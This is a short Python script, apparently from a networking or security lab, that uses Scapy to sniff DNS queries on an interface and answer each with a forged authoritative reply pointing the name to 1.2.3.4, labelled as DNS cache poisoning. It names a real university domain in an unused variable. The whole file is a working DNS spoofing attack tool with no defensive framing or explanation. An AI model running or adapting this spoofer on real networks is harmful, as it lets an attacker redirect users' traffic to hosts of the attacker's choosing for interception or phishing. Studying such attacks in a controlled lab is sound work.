from scapy.all import IP, UDP, DNS, DNSQR, sniff,DNSRR,send

dummy_ans = "1.2.3.4"
tar = "jct.ac.il"
def attack(pkt):
    if not pkt.haslayer(DNS): return

    # Ignore if a responce

    print(f"DNS Received Query: {pkt.summary()}")
    print("Redirecting to fake NS: => 1.2.3.4")
    
    query_name = pkt[DNSQR].qname.decode()
    client_ip = pkt[IP].src
    client_port = pkt[UDP].sport

    dns_reply = (
        IP(dst=client_ip, src=pkt[IP].dst) /
        UDP(dport=client_port, sport=53) /
        DNS(
            id=pkt[DNS].id,
            qr=1,           
            aa=1,           
            qd=pkt[DNS].qd, 
            an=DNSRR(rrname=query_name, ttl=300, rdata=dummy_ans)
        )
    )
    send(dns_reply, iface="eth0", verbose=0)

def main():
    print("DNS Cache Poisning ===>")
    sniff(iface="eth0", filter='udp port 53', prn=attack)

main()